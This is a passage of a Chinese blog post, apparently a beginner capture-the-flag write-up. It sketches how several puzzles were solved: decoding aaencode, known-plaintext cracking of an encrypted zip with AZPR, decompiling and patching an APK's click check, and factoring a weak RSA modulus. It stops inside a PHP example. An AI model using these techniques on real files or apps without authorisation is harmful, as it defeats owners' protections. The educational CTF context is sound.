@@ -1,0 +1,564 @@
+<!doctype html>
+<html lang="zh-CN" data-theme="light">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="generator" content="VuePress 2.0.0-rc.23" />
+    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.89" />
+    <style>
+      :root {
+        --vp-c-bg: #fff;
+      }
+
+      [data-theme="dark"] {
+        --vp-c-bg: #1b1b1f;
+      }
+
+      html,
+      body {
+        background: var(--vp-c-bg);
+      }
+    </style>
+    <script>
+      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
+      const systemDarkMode =
+        window.matchMedia &&
+        window.matchMedia("(prefers-color-scheme: dark)").matches;
+
+      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
+        document.documentElement.setAttribute("data-theme", "dark");
+      }
+    </script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"玩玩CTF","image":["http://7xkmnm.com1.z0.glb.clouddn.com/%E6%88%AA%E5%9B%BE1.PNG","http://7xkmnm.com1.z0.glb.clouddn.com/xls1.PNG","http://7xkmnm.com1.z0.glb.clouddn.com/xls2.PNG"],"datePublished":"2017-10-24T00:00:00.000Z","dateModified":"2024-09-29T15:21:40.000Z","author":[{"@type":"Person","name":"Guohao","url":"https://space.vistazx1.top"}]}</script><meta property="og:url" content="https://space.vistazx1.top/posts/2017-10-24-ctf.html"><meta property="og:site_name" content="Vista"><meta property="og:title" content="玩玩CTF"><meta property="og:description" content="Xp0int大家庭 Xp0int日常，跑一下我们在干什么？ 网上搜索发现是 aaencode 所以试试在chrome的console运行。 得到flag 弗拉戈在哪里？ 小明整蛊舍友，将他舍友的兰博基尼钥匙锁在zip里面了，你能帮他找回钥匙吗？ 提示： 在zip里面 1.zip 拖进UltraEdit 搜索flag 发现一段base64，于是解码。应该..."><meta property="og:type" content="article"><meta property="og:image" content="http://7xkmnm.com1.z0.glb.clouddn.com/%E6%88%AA%E5%9B%BE1.PNG"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2024-09-29T15:21:40.000Z"><meta property="article:tag" content="词频分析"><meta property="article:tag" content="quipqiup"><meta property="article:tag" content="strings"><meta property="article:tag" content="UltraEdit"><meta property="article:tag" content="zip"><meta property="article:tag" content="base64"><meta property="article:tag" content="aaencode"><meta property="article:published_time" content="2017-10-24T00:00:00.000Z"><meta property="article:modified_time" content="2024-09-29T15:21:40.000Z"><meta name="keywords" content="Vue,VuePress,博客,技术,AI,智能体,前端开发,LangGraph,GPT"><meta name="author" content="Guohao"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta property="og:type" content="website"><meta property="og:title" content="Guohao的技术博客"><meta property="og:description" content="专注于AI、智能体架构等技术分享"><meta property="og:url" content="https://space.vistazx1.top"><meta property="og:image" content="https://space.vistazx1.top/assets/icon/logo.svg"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Vista - Guohao的技术博客"><meta name="twitter:description" content="专注于AI、智能体架构等技术分享"><link rel="icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/assets/icon/logo.png"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="dns-prefetch" href="https://cdn.vistazx1.top"><meta name="application-name" content="Vista - Guohao的技术博客"><meta name="mobile-web-app-capable" content="yes"><meta name="theme-color" content="#46bd87"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="manifest" href="/manifest.webmanifest" crossorigin="use-credentials"><title>玩玩CTF | Vista</title><meta name="description" content="Xp0int大家庭 Xp0int日常，跑一下我们在干什么？ 网上搜索发现是 aaencode 所以试试在chrome的console运行。 得到flag 弗拉戈在哪里？ 小明整蛊舍友，将他舍友的兰博基尼钥匙锁在zip里面了，你能帮他找回钥匙吗？ 提示： 在zip里面 1.zip 拖进UltraEdit 搜索flag 发现一段base64，于是解码。应该...">
+    <link rel="preload" href="/assets/style-DqaRORH5.css" as="style"><link rel="stylesheet" href="/assets/style-DqaRORH5.css">
+    <link rel="modulepreload" href="/assets/app-CJlMl9Ja.js"><link rel="modulepreload" href="/assets/2017-10-24-ctf.html-DY5RuDg4.js"><link rel="modulepreload" href="/assets/plugin-vue_export-helper-DlAUqK2U.js">
+    
+  </head>
+  <body>
+    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">跳至主要內容</a><!--]--><div class="theme-container no-sidebar external-link-icon has-toc" vp-container><!--[--><header id="navbar" class="vp-navbar" vp-navbar><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><a class="route-link vp-brand" href="/" aria-label="带我回家"><img class="vp-nav-logo" src="/assets/icon/logo.svg" alt><!----><span class="vp-site-name hide-in-pad">Vista</span></a><!--]--></div><div class="vp-navbar-center"><!--[--><nav class="vp-nav-links"><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/" aria-label="首页"><!--[--><i class="vp-icon fas fa-home" sizing="height"></i><!--]-->首页<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/article/" aria-label="文章"><!--[--><i class="vp-icon fas fa-newspaper" sizing="height"></i><!--]-->文章<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/timeline/" aria-label="时间线"><!--[--><i class="vp-icon fas fa-clock" sizing="height"></i><!--]-->时间线<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/intro.html" aria-label="关于"><!--[--><i class="vp-icon fas fa-user" sizing="height"></i><!--]-->关于<!----></a></div></nav><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!----><div class="vp-nav-item hide-in-mobile"><button type="button" class="vp-color-mode-switch" id="color-mode-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" name="auto" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" name="dark" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" name="light" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar" vp-sidebar><!----><ul class="vp-sidebar-links"></ul><!----></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!----><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->玩玩CTF</h1><div class="page-info"><span class="page-author-info" aria-label="作者🖊" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon" name="author"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://space.vistazx1.top" target="_blank" rel="noopener noreferrer">Guohao</a></span><span property="author" content="Guohao"></span></span><span class="page-date-info" aria-label="写作日期📅" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon" name="calendar"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span data-allow-mismatch="text">2017/10/24</span><meta property="datePublished" content="2017-10-24T00:00:00.000Z"></span><span class="page-category-info" aria-label="分类🌈" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon category-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="category icon" name="category"><path d="M148.41 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H148.41c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.311-40.31zM147.556 553.478H429.73c22.263 0 40.311 18.048 40.311 40.31v282.176c0 22.263-18.048 40.312-40.31 40.312H147.555c-22.263 0-40.311-18.049-40.311-40.312V593.79c0-22.263 18.048-40.311 40.31-40.311zM593.927 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H593.927c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.31-40.31zM730.22 920.502H623.926c-40.925 0-74.22-33.388-74.22-74.425V623.992c0-41.038 33.387-74.424 74.425-74.424h222.085c41.038 0 74.424 33.226 74.424 74.067v114.233c0 10.244-8.304 18.548-18.547 18.548s-18.548-8.304-18.548-18.548V623.635c0-20.388-16.746-36.974-37.33-36.974H624.13c-20.585 0-37.331 16.747-37.331 37.33v222.086c0 20.585 16.654 37.331 37.126 37.331H730.22c10.243 0 18.547 8.304 18.547 18.547 0 10.244-8.304 18.547-18.547 18.547z"></path></svg><!--[--><span class="page-category-item color2 clickable" role="navigation">CTF</span><span class="page-category-item color6 clickable" role="navigation">安全</span><span class="page-category-item color1 clickable" role="navigation">渗透测试</span><!--]--><meta property="articleSection" content="CTF,安全,渗透测试"></span><span class="page-tag-info" aria-label="标签🏷" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon tag-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="tag icon" name="tag"><path d="M939.902 458.563L910.17 144.567c-1.507-16.272-14.465-29.13-30.737-30.737L565.438 84.098h-.402c-3.215 0-5.726 1.005-7.634 2.913l-470.39 470.39a10.004 10.004 0 000 14.164l365.423 365.424c1.909 1.908 4.42 2.913 7.132 2.913s5.223-1.005 7.132-2.913l470.39-470.39c2.01-2.11 3.014-5.023 2.813-8.036zm-240.067-72.121c-35.458 0-64.286-28.828-64.286-64.286s28.828-64.285 64.286-64.285 64.286 28.828 64.286 64.285-28.829 64.286-64.286 64.286z"></path></svg><!--[--><span class="page-tag-item color1 clickable" role="navigation">aaencode</span><span class="page-tag-item color5 clickable" role="navigation">base64</span><span class="page-tag-item color0 clickable" role="navigation">zip</span><span class="page-tag-item color3 clickable" role="navigation">UltraEdit</span><span class="page-tag-item color1 clickable" role="navigation">strings</span><span class="page-tag-item color3 clickable" role="navigation">quipqiup</span><span class="page-tag-item color4 clickable" role="navigation">词频分析</span><!--]--><meta property="keywords" content="aaencode,base64,zip,UltraEdit,strings,quipqiup,词频分析"></span><span class="page-reading-time-info" aria-label="阅读时间⌛" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon" name="timer"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>大约 10 分钟</span><meta property="timeRequired" content="PT10M"></span><span class="page-word-info" aria-label="字数🔠" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon word-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="word icon" name="word"><path d="M518.217 432.64V73.143A73.143 73.143 0 01603.43 1.097a512 512 0 01419.474 419.474 73.143 73.143 0 01-72.046 85.212H591.36a73.143 73.143 0 01-73.143-73.143z"></path><path d="M493.714 566.857h340.297a73.143 73.143 0 0173.143 85.577A457.143 457.143 0 11371.566 117.76a73.143 73.143 0 0185.577 73.143v339.383a36.571 36.571 0 0036.571 36.571z"></path></svg><span>约 3019 字</span><meta property="wordCount" content="3019"></span></div><hr></div><!----><div class="" vp-content><!----><div id="markdown-content"><h1 id="xp0int大家庭" tabindex="-1"><a class="header-anchor" href="#xp0int大家庭"><span>Xp0int大家庭</span></a></h1><blockquote><p>Xp0int日常，跑一下我们在干什么？</p></blockquote><p>网上搜索发现是 aaencode 所以试试在chrome的console运行。 得到flag</p><h1 id="弗拉戈在哪里" tabindex="-1"><a class="header-anchor" href="#弗拉戈在哪里"><span>弗拉戈在哪里？</span></a></h1><blockquote><p>小明整蛊舍友，将他舍友的兰博基尼钥匙锁在zip里面了，你能帮他找回钥匙吗？</p></blockquote><p>提示： 在zip里面</p><p>1.zip 拖进UltraEdit 搜索flag<br> 发现一段base64，于是解码。应该也能用strings命令看到base64。</p><h1 id="好像说太多了" tabindex="-1"><a class="header-anchor" href="#好像说太多了"><span>好像说太多了</span></a></h1><p>提示：说太多<br> 根据 ctf wiki的说法 用 https://quipqiup.com/ 词频分析，得到flag</p><blockquote><p>clues vtsegdt=welcome zg=to egdhtzozogf=competition</p></blockquote><blockquote><p>welcome to our competition!today is a nice day,i hope that you can win the prize and share it with me.our team is best in my mind,but i am too weak.so i am working hard to study.the most important thing is that i will tell you a secert that the flag is wordfrequencyanalysis.the trouble is that this analysis needs more to analyze, so i am going to have a chat with you.but i do not know what to talk about with you, i am very hard, i hope you can forgive me.</p></blockquote><h1 id="sga" tabindex="-1"><a class="header-anchor" href="#sga"><span>SGA</span></a></h1><p>看了提示才答出来的。后来觉得以图搜图可能也行。 百度： 标准银河字母。。。 得到对应的表</p><h1 id="warmup" tabindex="-1"><a class="header-anchor" href="#warmup"><span>warmup</span></a></h1><p>提示： 据说：这是Xp0int公众号热身赛的题目，emmmm好像有什么不一样了。</p><p>根据提示，使用githack获取到xp0.jpg ， 然后用foremost得到zip<br> 然后使用AZPR 来进行文本攻击： 将xp.jpg 压缩，确认xp.jpg的crc32与加密的压缩包一致，然后开始即可。<br> 参考：http://www.360zhijia.com/360anquanke/217342.html</p><h1 id="combo" tabindex="-1"><a class="header-anchor" href="#combo"><span>combo</span></a></h1><p>用jd-gui反编译，查看得出来的java代码 ，再对应smali 把if 的判断删掉，编译出apk，点击按钮即得到倒序的flag</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-java"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> onClick</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">View</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> paramView)</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  {</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    switch</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">paramView</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    {</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    default:</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    case</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2131427423</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    }</span></span>
+<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">currentClkTime</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> System</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">currentTimeMillis</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">currentClkTime</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">lastClkTime</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> &lt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 500L</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    {</span></span>
+<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">      this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">      label58</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">showCombo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;当前连击次数：&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot; 次&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      if</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> !=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 201710</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        break</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> label129</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
+<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">      this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">showFlag</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2131099682</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    }</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    while</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    {</span></span>
+<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">      this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">lastClkTime</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">currentClkTime</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      break</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
+<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">      this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      break</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> label58</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">      label129</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> if</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> &lt;=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2017</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        continue</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
+<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">      this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">showFlag</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;连击 201710 次就可以获得flag啦！&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    }</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  }</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h1 id="弗拉戈在哪里2" tabindex="-1"><a class="header-anchor" href="#弗拉戈在哪里2"><span>弗拉戈在哪里2?</span></a></h1><p>用strings命令，直接得到flag</p><h1 id="easyrsa" tabindex="-1"><a class="header-anchor" href="#easyrsa"><span>EasyRSA</span></a></h1><p>参考文章 http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html</p><p>因为没有研究过rsa,所以只能follow文章去做。 已知 n e c<br> 把 n 放到 http://factordb.com 上分解，分解成功，得到p q。 e = 0x10001。<br> 用工具计算n 遂得到 m = pow(c, d, n)</p><h1 id="《web安全入门第一课》-《web安全入门第二课》-一段矛盾的代码" tabindex="-1"><a class="header-anchor" href="#《web安全入门第一课》-《web安全入门第二课》-一段矛盾的代码"><span>《web安全入门第一课》 ，《web安全入门第二课》 ，一段矛盾的代码</span></a></h1><p>矛盾的代码，这个虽然不太懂，没接触过PHP，但有了源码就可以搜索相关的问题。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>is_numeric(1a)   FALSE</span></span>
